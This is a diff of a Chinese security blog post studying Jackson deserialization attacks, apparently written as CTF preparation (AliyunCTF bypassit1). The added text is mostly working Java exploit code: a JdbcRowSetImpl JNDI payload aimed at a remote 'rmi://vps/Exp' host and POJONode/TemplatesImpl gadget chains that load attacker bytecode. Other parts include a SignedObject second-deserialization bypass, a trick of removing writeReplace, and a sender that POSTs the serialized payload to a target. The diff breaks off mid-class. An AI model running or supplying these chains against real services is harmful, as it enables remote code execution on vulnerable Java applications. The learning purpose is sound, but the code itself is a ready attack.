@@ -23,10 +23,28 @@
 <meta property="og:site_name" content="Zer0peach can&#39;t think">
 <meta property="og:description" content="Jackson前言： 自从在一次比赛之后看了Boogipop大佬的wp后，了解到了Jackson，现在心心念念的Jackson终于要开始啦 序列化与反序列化ObjectMapper.writeValueAsString()    序列化     ObjectMapper.readValue()       反序列化 多态问题DefaultTyping JAVA_LANG_OBJECT OBJECT">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/Jackson/image-20231116184725409.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Jackson/image-20231116190917633.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Jackson/image-20231116191013118.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Jackson/image-20231116190828568.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Jackson/image-20231116191438854.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Jackson/image-20231118001138170.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Jackson/image-20231118002202020.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Jackson/image-20231118002455283.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Jackson/image-20231118002832449.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Jackson/image-20231118002948992.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Jackson/image-20231118154029847.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Jackson/image-20231118155057092.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Jackson/image-20231118161431828.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Jackson/image-20231118162500653.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Jackson/image-20231118162554090.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Jackson/image-20231118162614666.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Jackson/image-20231118162632689.png">
 <meta property="article:published_time" content="2023-09-27T14:18:23.000Z">
-<meta property="article:modified_time" content="2023-09-30T10:39:19.520Z">
+<meta property="article:modified_time" content="2023-11-18T11:37:56.957Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/Jackson/image-20231116184725409.png">
   
   
   
@@ -231,7 +249,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.6k 字
+          27k 字
         
       </span>
     
@@ -242,7 +260,7 @@
         
         
         
-          30 分钟
+          225 分钟
         
       </span>
     
@@ -372,7 +390,7 @@ Exception <span class="hljs-keyword">in</span> thread <span class="hljs-string">
 <p>序列化的结果是有数组的，修改包名和类名就行</p>
 <div class="code-wrapper"><pre><code class="hljs prolog">&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;zero&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>:[<span class="hljs-string">&quot;jackson.User2&quot;</span>,&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;tana&quot;</span>&#125;]&#125;</code></pre></div>
 
-<p>payload:</p>
+<p>payload:      （【】中第一个是指定的类，{}中是赋值）</p>
 <div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://vps/Exp&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span></code></pre></div>
 
 <div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span> </span>&#123;
@@ -382,9 +400,684 @@ Exception <span class="hljs-keyword">in</span> thread <span class="hljs-string">
 
 <div class="code-wrapper"><pre><code class="hljs swift"><span class="hljs-type">ObjectMapper</span> mapper <span class="hljs-operator">=</span> new <span class="hljs-type">ObjectMapper</span>();
 mapper.enableDefaultTyping(<span class="hljs-type">ObjectMapper</span>.<span class="hljs-type">DefaultTyping</span>.<span class="hljs-type">JAVA_LANG_OBJECT</span>); 
+
 <span class="hljs-type">Student</span> s2 <span class="hljs-operator">=</span> mapper.readValue(<span class="hljs-string">&quot;&#123;<span class="hljs-subst">\&quot;</span>name<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>5wimming<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>sex<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>boy<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>myObject<span class="hljs-subst">\&quot;</span>:[<span class="hljs-subst">\&quot;</span>jacksonn.Test<span class="hljs-subst">\&quot;</span>,&#123;<span class="hljs-subst">\&quot;</span>testt<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>test<span class="hljs-subst">\&quot;</span>&#125;]&#125;&quot;</span>, <span class="hljs-type">Student</span>.class);
 
 <span class="hljs-comment">//myobject被object修饰</span></code></pre></div>
+
+<h1 id="反序列化链"><a href="#反序列化链" class="headerlink" title="反序列化链"></a>反序列化链</h1><blockquote>
+<p>Reference </p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12966#toc-6">深入浅出解析Jackson反序列化 - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/05/16/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/">Jackson反序列化通杀Web题(过时) - Boogiepop Doesn’t Laugh (boogipop.com)</a></p>
+</blockquote>
+<h2 id="POJONode-（实际调用的是-BaseJsonNode）"><a href="#POJONode-（实际调用的是-BaseJsonNode）" class="headerlink" title="POJONode （实际调用的是 BaseJsonNode）"></a>POJONode （实际调用的是 BaseJsonNode）</h2><p>POJONode中不存在有<code>toString</code>方法的实现，在其父类<code>BaseJsonNode</code>中存在有，因其为一个抽象类，所以选择使用<code>POJONode</code>这个没有实现<code>toString</code>方法的类进行利用</p>
+<p><code>toString -&gt; InternalNodeMapper#nodeToString -&gt; ObjectWriter.writeValueAsString</code>方法</p>
+<p>最关键的就是最后一个方法的调用了，将一个Bean对象序列化一个json串的使用常用的方法是<code>writeValueAsString</code>方法，在调用该方法的过程中将会通过遍历的方法将bean对象中的所有的属性的getter方法进行调用</p>
+<h2 id="Other-Gadgets-绕过技巧"><a href="#Other-Gadgets-绕过技巧" class="headerlink" title="Other Gadgets  绕过技巧"></a>Other Gadgets  绕过技巧</h2><p>按照理论来说只需要寻找到继承<code>BaseJsonNode</code>的类，并且没有重写<code>toSting</code>方法，就能够替代<code>POJONode</code>类</p>
+<h2 id="通杀-（不知道为什么叫通杀，就是调用toString而已）"><a href="#通杀-（不知道为什么叫通杀，就是调用toString而已）" class="headerlink" title="通杀 （不知道为什么叫通杀，就是调用toString而已）"></a>通杀 （不知道为什么叫通杀，就是调用toString而已）</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jackson;
+
+<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+
+<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;
+<span class="hljs-keyword">import</span> java.io.*;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+<span class="hljs-keyword">import</span> java.nio.file.Files;
+<span class="hljs-keyword">import</span> java.nio.file.Paths;
+<span class="hljs-keyword">import</span> java.sql.SQLOutput;
+<span class="hljs-keyword">import</span> java.util.Base64;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+
+        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();
+
+        <span class="hljs-type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;</span>));
+
+        setValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);
+        setValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;bytecodes&#125;);
+        setValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());
+
+        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templatesimpl);
+
+        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);
+<span class="hljs-comment">//        Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);</span>
+<span class="hljs-comment">//        val.setAccessible(true);</span>
+<span class="hljs-comment">//        val.set(exp,jsonNodes);</span>
+        setValue(exp,<span class="hljs-string">&quot;val&quot;</span>,jsonNodes);
+
+        deserial((serial(exp)));
+       
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);
+        oos.writeObject(o);
+        oos.close();
+
+        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());
+        <span class="hljs-keyword">return</span> base64String;
+
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);
+        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);
+        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);
+        ois.readObject();
+        ois.close();
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;
+        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);
+        field.setAccessible(<span class="hljs-literal">true</span>);
+        field.set(obj, value);
+    &#125;
+&#125;</code></pre></div>
+
+<p>和fastjson差不多，用的是POJONode</p>
+<h2 id="jackson最关键的是这里-！！！！"><a href="#jackson最关键的是这里-！！！！" class="headerlink" title="jackson最关键的是这里  ！！！！"></a>jackson最关键的是这里  ！！！！</h2><p><code>POJONode</code>是继承<code>ValueNode</code>的 <code>ValueNode</code>是继承<code>BaseJsonNode</code>的</p>
+<p>而在<code>BaseJsonNode</code>中存在</p>
+<div class="code-wrapper"><pre><code class="hljs csharp"><span class="hljs-function">Object <span class="hljs-title">writeReplace</span>()</span> &#123;
+        <span class="hljs-keyword">return</span> NodeSerialization.<span class="hljs-keyword">from</span>(<span class="hljs-keyword">this</span>);
+    &#125;</code></pre></div>
+
+<p>意味着 我们在反序列化的时候 会经过这个writeReplace方法 这个方法会对我们的序列化过程进行检查 从而阻止我们的序列化进程，我们需要将其重写出来 将这个方法去掉</p>
+<p><img src="/../images/Jackson/image-20231116184725409.png" srcset="/img/loading.gif" lazyload alt="image-20231116184725409"></p>
+<p>按照图示本地生成，复制粘贴BaseJsonNode的内容，然后在本地的文件中删除</p>
+<div class="code-wrapper"><pre><code class="hljs csharp"><span class="hljs-function">Object <span class="hljs-title">writeReplace</span>()</span> &#123;
+        <span class="hljs-keyword">return</span> NodeSerialization.<span class="hljs-keyword">from</span>(<span class="hljs-keyword">this</span>);
+    &#125;</code></pre></div>
+
+<h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p><img src="/../images/Jackson/image-20231116190917633.png" srcset="/img/loading.gif" lazyload alt="image-20231116190917633"></p>
+<p>这是本地的<code>BaseJsonNode</code></p>
+<p><img src="/../images/Jackson/image-20231116191013118.png" srcset="/img/loading.gif" lazyload alt="image-20231116191013118"></p>
+<p><img src="/../images/Jackson/image-20231116190828568.png" srcset="/img/loading.gif" lazyload alt="image-20231116190828568"></p>
+<p>之后一直调试，一直到<code>serializeAsField</code></p>
+<p><img src="/../images/Jackson/image-20231116191438854.png" srcset="/img/loading.gif" lazyload alt="image-20231116191438854"></p>
+<h2 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jackson;
+
+<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+<span class="hljs-keyword">import</span> org.springframework.http.HttpEntity;
+<span class="hljs-keyword">import</span> org.springframework.http.HttpHeaders;
+<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
+<span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;
+
+<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;
+<span class="hljs-keyword">import</span> javax.xml.transform.Templates;
+<span class="hljs-keyword">import</span> java.io.*;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+<span class="hljs-keyword">import</span> java.net.URI;
+<span class="hljs-keyword">import</span> java.nio.file.Files;
+<span class="hljs-keyword">import</span> java.nio.file.Paths;
+<span class="hljs-keyword">import</span> java.security.*;
+<span class="hljs-keyword">import</span> java.sql.SQLOutput;
+<span class="hljs-keyword">import</span> java.util.Base64;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+
+        <span class="hljs-type">Templates</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();
+
+<span class="hljs-comment">//        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;));</span>
+        <span class="hljs-type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\jackson\\InjectToController.class&quot;</span>));
+
+        setValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);
+        setValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;bytecodes&#125;);
+        setValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());
+
+
+        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templatesimpl);
+
+        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);
+
+        setValue(exp,<span class="hljs-string">&quot;val&quot;</span>,jsonNodes);
+
+        KeyPairGenerator keyPairGenerator;
+        keyPairGenerator = KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);
+        keyPairGenerator.initialize(<span class="hljs-number">1024</span>);
+        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();
+        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();
+        <span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);
+        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(exp,privateKey,signingEngine);
+        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);
+        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);
+        setValue(exp1,<span class="hljs-string">&quot;val&quot;</span>,jsonNode);
+
+
+        System.out.println((serial(exp1)));
+
+
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);
+        oos.writeObject(o);
+        oos.close();
+
+        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());
+        <span class="hljs-keyword">return</span> base64String;
+
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);
+        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);
+        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);
+        ois.readObject();
+        ois.close();
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;
+        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);
+        field.setAccessible(<span class="hljs-literal">true</span>);
+        field.set(obj, value);
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPOST</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;
+        <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">requestHeaders</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();
+        requestHeaders.set(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;text/plain&quot;</span>);
+<span class="hljs-comment">//        URI url = new URI(&quot;http://neepusec.fun:27010/nomap&quot;);</span>
+        <span class="hljs-type">URI</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URI</span>(<span class="hljs-string">&quot;http://192.168.113.134:8080/bypassit&quot;</span>);
+        <span class="hljs-comment">//URI url = new URI(&quot;http://localhost:8080/bypassit&quot;);</span>
+        HttpEntity&lt;<span class="hljs-type">byte</span>[]&gt; requestEntity = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span> &lt;&gt; (obj,requestHeaders);
+
+        <span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();
+        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);
+        System.out.println(res.getBody());
+    &#125;
+
+&#125;
+</code></pre></div>
+
+
+
+<h2 id="AliyunCTF-bypassit1"><a href="#AliyunCTF-bypassit1" class="headerlink" title="AliyunCTF bypassit1"></a>AliyunCTF bypassit1</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jackson;
+
+<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+<span class="hljs-keyword">import</span> org.springframework.http.HttpEntity;
+<span class="hljs-keyword">import</span> org.springframework.http.HttpHeaders;
+<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
+<span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;
+
+<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;
+<span class="hljs-keyword">import</span> javax.xml.transform.Templates;
+<span class="hljs-keyword">import</span> java.io.*;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+<span class="hljs-keyword">import</span> java.net.URI;
+<span class="hljs-keyword">import</span> java.nio.file.Files;
+<span class="hljs-keyword">import</span> java.nio.file.Paths;
+<span class="hljs-keyword">import</span> java.security.*;
+<span class="hljs-keyword">import</span> java.sql.SQLOutput;
+<span class="hljs-keyword">import</span> java.util.Base64;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+
+        <span class="hljs-type">Templates</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();
+
+<span class="hljs-comment">//        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;));</span>
+        <span class="hljs-type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\jackson\\InjectToController.class&quot;</span>));
+
+        setValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);
+        setValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;bytecodes&#125;);
+        setValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());
+
+
+        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templatesimpl);
+
+        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);
+
+        setValue(exp,<span class="hljs-string">&quot;val&quot;</span>,jsonNodes);
+
+        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);
+        objectOutputStream.writeObject(exp);
+
+<span class="hljs-comment">//        deserial(serial(objectOutputStream));</span>
+        FileOutputStream fout=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;1.ser&quot;</span>);
+        fout.write(barr.toByteArray());
+        fout.close();
+        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;1.ser&quot;</span>);
+        <span class="hljs-type">byte</span>[] byt=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[fileInputStream.available()];
+        fileInputStream.read(byt);
+        doPOST(byt);
+
+<span class="hljs-comment">//        System.out.println((serial(exp)));</span>
+
+
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);
+        oos.writeObject(o);
+        oos.close();
+
+        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());
+        <span class="hljs-keyword">return</span> base64String;
+
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);
+        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);
+        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);
+        ois.readObject();
+        ois.close();
+    &#125;
+
